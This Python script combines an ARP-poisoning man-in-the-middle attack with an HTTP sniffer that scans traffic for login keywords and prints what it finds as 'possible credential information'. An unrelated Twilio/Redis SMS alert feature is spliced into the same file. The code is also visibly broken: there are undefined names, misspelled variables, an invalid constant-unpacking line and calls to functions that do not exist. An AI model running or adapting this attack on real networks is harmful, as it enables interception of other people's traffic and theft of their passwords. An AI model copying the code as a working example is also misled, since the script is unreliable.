from time import sleep
import sys
import os
import requests
from bs4 import BeautifulSoup
from twilio.rest import Client
from twilio.twiml.messaging_response import MessagingResponse
import redis
import platform
from scapy.all import *
from scapy.layers.l2 import Ether
from scapy.layers import http
import argparse


# TODO
[OSX, MAC_ADDRESS_CLEAN_PATTERN, ARP, SIGNATURE, TWILIO_SID, PHONE_NUMBER, TWILIO_TOKEN, INTERCEPT_URL] = ['load_from_env']

client = Client(TWILIO_SID, TWILIO_TOKEN)
redis_client = redis.StrictRedis(host=REDIS_HOST, port=REDIS_PORT, db=0)

def port_forwarding(flag=1):
    """
    require security privilege (sudoer)
    :arg flag: 1 - enable port forwarding
               0 - disable port forwarding
    """
    flag = str(flag)
    if platform.system() == LINUX:
        # case we deal with linux os
        os.system('echo ' + flag + ' > /proc/sys/net/ipv4/ip_forward')
    elif platform.system() == OSX:
        # case we deal with OSX - Darwin
        os.system('sysctl -w net.inet.ip.forwarding=' + flag)
    else:
        log('Could not use port forwarding, you may want to try enable it manually...')


def get_mac(ip, interface):
    """
    Retrieve mac address of given ip address within a given interface
    :param ip: ip address
    :param interface: interface
    :return:  mac address (Ether.src) field of the packet
    """
    conf.verb = 0
    ans, unans = srp(Ether(dst=MAC_ADDRESS_CLEAN_PATTERN) / ARP(pdst=ip), timeout=2, iface=interface, inter=0.1)
    for snd, rcv in ans:
        return rcv.sprintf(r"%Ether.src%")


def done(ip, r, interface):
    """
    restoring the session between the targets
    :param ip: target ip
    :param r: router ip
    :param interface: interface to operate
    """
    log('Restoring Targets...')
    victim_mac = get_mac(ip, interface)
    gate_mac = get_mac(r, interface)
    send(ARP(op=2, pdst=r, psrc=ip, hwdst=MAC_ADDRESS_CLEAN_PATTERN, hwsrc=victim_mac), count=7)
    send(ARP(op=2, pdst=ip, psrc=r, hwdst=MAC_ADDRESS_CLEAN_PATTERN, hwsrc=gate_mac), count=7)
    log('Disabling IP Forwarding...')
    port_forwarding(0)
    log('Shutting Down...')
    sys.exit(1)


def arp_poison(vm, gm, ip, r, interface, cerr=0):
    """
    do arp poison, if libnet not up yet give up to 10 retries
    to let it up
    :param vm: victim mac address
    :param gm: router mac address
    :param ip: victim ip address
    :param r:  router ip address
    :param interface: interface to operate on
    :param cerr: optional in case of error (not required by the user)
    :return: None
    """
    try:
        send(ARP(op=2, pdst=ip, psrc=r, hwdst=vm))
        send(ARP(op=2, pdst=r, psrc=ip, hwdst=gm))
    except AttributeError:
        if cerr == 10:
            log('too much errors handled while waiting libnet, sorry, quiting')
            port_forwarding(0)
            exit(0)
        cerr += 1
        # recall with error argument
        # this may be required while netlib sometimes loaded after scapy
        # while scapy using it as a dependency we get an error
        # this recursion prevent error situation
        arp_poison(gm, vm, ip, r, interface, cerr)


def mitm(ip, r, interface):
    """
    Executing the man in the middle attack
    :param ip: target ip address
    :param r: router ip address
    :param interface: interface to operate on
    """
    step = 0
    err_map = {0: '[!] Error could not find victim mac address, force quit!',
               1: '[!] Error could not find getway mac address, force quit!'}
    try:
        port_forwarding(1)
        victim_mac = get_mac(ip, interface)
        step = 1
        gate_mac = get_mac(r, interface)
        step = 2
    except Exception as e:
        port_forwarding(0)
        log(err_map[step])  # print error by the error dictionary
        log("[!] Exiting...")
        sys.exit(1)

    log("Poisoning Target ...")
    while 1:
        try:
            arp_poison(victim_mac, gate_mac, ip, r, interface)
            sleep(1.5)
        except KeyboardInterrupt:
            done(ip, r, interface)
            break

def send_msg(rec, body):
    message = client.messages.create(to=rec, from_=PHONE_NUMBER, body=body)

def read_intercept(url=INTERCEPT_URL):
    """
        Scramble and read from webpage
    """
    r = requests.get(url)
    soup = BeautifulSoup(r.text, 'html.parser')
    # todo parse html
    for row in soup.find_all('tr'):
        cols = [ele.text for ele in row.find_all('td')]
        if cols:
            queue = redis_client.smembers(cols)
            for q in queue:
                message(q.decode('utf-8'), body=f"Webpage contains")
                redis_client.srem(cols, q)

def read_sms():
    if request.forms['AccountSID'] is not TWILIO_SID:
        raise Exception("Invalid Twilio SID")
    user = request.form['Form']
    ele_array = requst.form['Body'].strip().upper()
    redis_client.sadd(ele_array, user.encode('utf-8'))


def log(msg):
    """
    logging a message with signature
    :param msg: msg represented as a string
    """
    print(SIGNATURE + msg)


def get_args():
    parser = argparse.ArgumentParser()
    parser.add_argument('-i', '--interface', dest='interface',
                        help='Interface Name for which packet is supposed to be captured.')
    options = parser.parse_args()

    if not options.interface:
        parser.error('[-] Please specify the name of the interface, use --help for more info.')

    return options.interface


def sniffer(interface):
    scapy.sniff(iface=interface, store=False, prn=process_packet)


def process_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print('[+] HTTP Requests/URL Requested -> {}'.format(url), '\n')
        cred = get_credentials(packet)
        if cred:
            print('\n\n[+] Possible Credential Information -> {}'.format(cred), '\n\n')


def get_url(packet):
    return (packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path).decode('utf-8')


keywords = ('username', 'uname', 'user', 'login', 'password', 'pass', 'signin', 'signup', 'name')


def get_credentials(packet):
    if packet.haslayer(scapy.Raw):
        field_load = packet[scapy.Raw].load.decode('utf-8')
        for keyword in keywords:
            if keyword in field_load:
                return field_load